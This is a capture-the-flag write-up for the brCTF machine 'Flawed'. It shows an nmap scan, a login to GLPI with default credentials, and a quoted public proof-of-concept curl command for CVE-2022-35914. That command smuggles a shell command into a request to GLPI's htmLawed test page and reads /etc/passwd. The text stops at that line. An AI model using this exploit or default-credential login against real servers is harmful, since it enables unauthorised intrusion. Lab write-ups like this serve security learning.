# Flawed machine from brCTF

## Information Gathering/Reconnaissance
As is customary, we initiate our preferred network scanning tool, Nmap, to conduct initial reconnaissance. Our scan reveals that port 80, which is typically associated with HTTP and port 22, are accessible. <br>
`nmap -sC -sV -oN flawed.nmap 10.0.160.157`
```
Nmap scan report for 10.0.160.157
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Authentication - GLPI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

In the second phase of our reconnaissance, we proceed to examine the application hosted on port 80 by accessing it through our web browser. To our surprise, we are welcomed with a login page. Quite intriguing!
![GLPI Login](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/glpi-login.png "a title")

After a brief research on google we discovered default credentials for GLPI which we can try on out target.
![google glpi logins](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/glpi-default-creds.png "a title")

We now attempt to login to GLPI and viola!!<br>
From there we move on with out recon and attempt to find the version of GLPI running. Hopefully we can find publicly available exploits.
![glpi logged in](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/checking-glpi-version.png "a title")
The version of GLPI can be seen in the photo below.
![glpi version enum](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/glpi-version.png "a title")

Now that we know the version running, we can google it to find avaiable exploits and shortly after, we find one on github from [Orange-CyberDefense](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh)

```curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://localhost/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'```
